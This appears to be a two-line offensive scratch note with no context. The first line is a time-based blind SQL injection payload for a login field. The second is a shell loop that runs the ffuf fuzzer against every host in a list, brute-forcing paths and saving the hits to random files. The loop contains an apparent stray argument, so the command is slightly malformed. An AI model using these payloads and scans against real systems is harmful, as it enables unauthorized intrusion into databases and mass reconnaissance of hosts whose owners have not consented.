admin'XOR(if(now()=sysdate(),sleep(20),0))XOR'
for i in $(cat list.txt); do ./ffuf.exe -w word.txt -u https://$i/FUZZ -o $(shuf -i 10000000-99999999 -n 1).txt -mc 200,301,302 d.txt; done
